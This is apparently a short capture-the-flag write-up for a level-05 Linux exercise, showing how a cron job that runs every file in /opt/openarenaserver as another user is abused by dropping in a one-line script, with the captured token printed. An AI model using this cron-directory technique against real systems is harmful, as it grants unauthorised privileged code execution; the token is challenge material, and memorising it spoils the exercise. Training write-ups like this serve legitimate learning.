We have a mail ! (thanks vm for your restart)
mail is  at /var/mail/level05
```*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05```
The useless * at the start are realy useless it's a crontab format !
cron probably run it from somewhere else cause while trying to add this one, it did call it

openarenaserver is this :
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
so let put a small script in /opt/openarenaserver/
like 
```

getflag > /tmp/flag.out
```
2 minutes after we get this in flag.out
```Check flag.Here is your token : viuaaale9huek52boumoomioc```
